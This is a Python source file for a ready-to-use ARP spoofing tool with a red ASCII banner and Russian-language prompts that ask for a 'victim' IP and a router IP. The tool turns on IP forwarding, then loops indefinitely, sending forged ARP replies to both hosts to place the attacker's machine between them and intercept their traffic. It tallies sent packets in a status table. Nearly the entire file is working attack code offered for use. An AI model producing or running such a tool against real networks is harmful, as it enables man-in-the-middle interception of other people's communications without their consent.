from rich.console import Console
from rich.table import Table
import scapy.all as scapy
import datetime
import time
import os
from pystyle import Center
from termcolor import colored


console = Console()

def print_arp_logo():
    console.print("    █████╗ ██████╗ ██████╗ ███████╗██████╗  ██████╗  ██████╗ ███████╗", style="red", justify="center")
    console.print("   ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝", style="red", justify="center")
    console.print(" ███████║██████╔╝██████╔╝███████╗██████╔╝██║   ██║██║   ██║█████╗  ", style="red", justify="center")
    console.print(" ██╔══██║██╔══██╗██╔═══╝ ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝  ", style="red", justify="center")
    console.print("██║  ██║██║  ██║██║     ███████║██║     ╚██████╔╝╚██████╔╝██║     ", style="red", justify="center")
    console.print("╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ", style="red", justify="center")
    console.print("|   Version 1.0   |   Created by ZiYou    |    @ziyou_off   |     ", style="red", justify="center")                                          


def get_mac(ip):
    arp = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return answered_list[0][1].hwsrc
    client_list = []

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

def ArpSpooferMain():
    import main
    main.uclear()
    print_arp_logo()
    try:
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        print('[OK] echo 1 > /proc/sys/net/ipv4/ip_forward')
    except:
        print('[error] echo 1 > /proc/sys/net/ipv4/ip_forward')
        print("\n\n\n\n\n\n\n")
        
    mamont_ip = input(Center.XCenter(colored('[+]Введите ip жертвы >> ', "red")))
    router_ip = input(Center.XCenter(colored('[+]Введите ip роутера >> ', "red")))

    count_packet = 0

    count_true_packet = 0
    count_error_packet = 0

    count_mamont_packet = 0
    count_router_packet = 0

    count_mamont_true_packet = 0
    count_mamont_error_packet = 0

    count_router_true_packet = 0
    count_router_error_packet = 0


    table = Table(title="ArpSpoof атака        stop >> Ctrl + z", title_justify="left")
    table.add_column("ip жертвы", style="red", max_width=25)
    table.add_column("Номер пакетa", style="blue", max_width=25)
    table.add_column("Статус пакета", style="yellow", max_width=25)
    table.add_column("-", style="black", justify="center", max_width=25)
    table.add_column("ip Роутера", style="red", max_width=25)
    table.add_column("Номер пакетa", style="blue", max_width=25)
    table.add_column("Статус пакета", style="yellow", max_width=25)



    while True:
        os.system('clear')
        print_arp_logo()
        console.print('[*] Попыток отправить пакеты > ' + str(count_packet), style="yellow", justify="center")
        console.print('[+] Отправленно пакетов > ' + str(count_true_packet), style="green", justify="center")
        console.print('[!] Неотправленно пакетов > ' + str(count_error_packet), style="red", justify="center")
        print('\n')
        console.print('[*] Попыток отправить пакеты Жертве > ' + str(count_mamont_packet), style="yellow", justify="center")
        console.print('[+] Отправленно пакетов Жертве > ' + str(count_mamont_true_packet), style="green", justify="center")
        console.print('[!] Неотправленно пакетов Жертве > ' + str(count_mamont_error_packet), style="red", justify="center")
        print('\n')
        console.print('[*] Попыток отправить пакеты Роутеру > ' + str(count_router_packet), style="yellow", justify="center")
        console.print('[+] Отправленно пакетов Роутеру > ' + str(count_router_true_packet), style="green", justify="center")
        console.print('[!] Неотправленно пакетов Роутеру > ' + str(count_router_error_packet), style="red", justify="center")
        console.print(table, justify='center')

        try:
            spoof(mamont_ip, router_ip)
            count_packet += 1
            count_mamont_packet += 1
            count_true_packet += 1
            count_mamont_true_packet += 1
            mamont_packet_status = "✅Отправленно"

        except:
            count_packet += 1
            count_mamont_packet += 1
            count_error_packet += 1
            count_mamont_error_packet += 1
            mamont_packet_status = "⛔Ошибка"


        try:
            spoof(router_ip, mamont_ip)
            count_packet += 1
            count_router_packet += 1
            count_true_packet += 1
            count_router_true_packet += 1
            router_packet_status = "✅Отправленно"

        except:
            count_packet += 1
            count_router_packet += 1
            count_error_packet += 1
            count_router_error_packet += 1
            router_packet_status = "⛔Ошибка"

        table.add_row(str(mamont_ip), 
                      str(count_mamont_packet),
                      str(mamont_packet_status), 
                      "-",
                      str(router_ip),
                      str(count_mamont_packet),
                      str(router_packet_status))
        time.sleep(2)

